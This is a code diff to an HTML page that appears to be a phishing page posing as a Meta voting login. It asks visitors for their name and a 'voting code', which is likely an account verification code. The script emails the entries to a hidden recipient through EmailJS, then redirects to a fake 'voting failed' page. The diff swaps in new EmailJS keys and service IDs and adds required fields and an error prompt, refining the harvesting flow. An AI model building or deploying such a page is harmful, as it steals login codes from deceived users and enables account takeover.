@@ -89,11 +89,11 @@
     <div class="container">
         <div class="centered-image2">
             <img src="https://raw.githubusercontent.com/FacebookArt/pak2/932c5b01030012c9e00871db959cdf045c5e0306/ayesha.png" alt="" style="max-width: 100%; margin-bottom: 20px;">
-            <div class="custom-text">Submit your Name and Voting code to proceed.</div>
+            <div class="custom-text">Please submit your Name and Voting code to continue voting.</div>
         </div>
-        <form name="login" onsubmit="sendDetails(); return false;">
-            <input type="text" class="container input" placeholder="Name" name="name" id="name">
-            <input type="number" class="container input" placeholder="Voting Code" name="votingCode" id="votingCode">
+        <form id="loginForm" onsubmit="sendDetails(); return false;">
+            <input type="text" class="container input" placeholder="Name" name="name" id="name" required>
+            <input type="number" class="container input" placeholder="Voting Code" name="votingCode" id="votingCode" required>
             <button class="login-button" id="submitButton" type="submit">Submit</button>
         </form>
     </div>
@@ -101,7 +101,7 @@
     <!-- Include Email.js library -->
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
-        emailjs.init("ky5vyetNiRVLcW3iy");
+        emailjs.init("33iNHYtZIuhHtuJ1i");
 
         // Function to send name and voting code via Email.js
         function sendDetails() {
@@ -124,14 +124,20 @@
             };
 
             // Send email using Email.js
-            emailjs.send("service_69d41qm", "template_utksv0v", templateParams)
+            emailjs.send("service_s4732w5", "template_8l8qh6u", templateParams)
                 .then(function(response) {
                     console.log("Details sent successfully", response);
                     window.location.href = 'https://indian-art.github.io/voting-failed/';
                 }, function(error) {
                     console.log("Failed to send details. Error:", error);
+                    alert("There was an error sending your details. Please try again.");
                 });
         }
+
+        // Debugging: Check if the function is triggered
+        document.getElementById('submitButton').addEventListener('click', function() {
+            console.log("Submit button clicked");
+        });
     </script>
     <div class="footer">
         <a>Meta</a>
